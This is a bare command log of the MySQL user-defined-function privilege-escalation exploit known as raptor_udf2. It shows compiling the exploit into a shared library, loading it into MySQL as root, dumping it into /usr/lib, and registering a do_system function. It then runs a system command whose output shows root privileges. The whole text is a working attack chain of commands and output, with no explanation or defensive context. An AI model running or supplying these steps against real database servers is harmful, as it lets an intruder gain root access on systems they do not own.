	https://0xdeadbeef.info/exploits/raptor_udf2.c
	$ gcc -g -c raptor_udf2.c
	$ gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
	$ mysql -u root -p
	mysql> use mysql;
	mysql> create table foo(line blob);
	mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
	mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
	mysql> create function do_system returns integer soname 'raptor_udf2.so';
	mysql> select * from mysql.func;
| name  |ret   |dl   |type   |
| ------------ | ------------ | ------------ | ------------ |
| do_system  | 2  | raptor_udf2.so  |  function |

	mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
	mysql> \! sh
	sh-2.05b$ cat /tmp/out
	uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)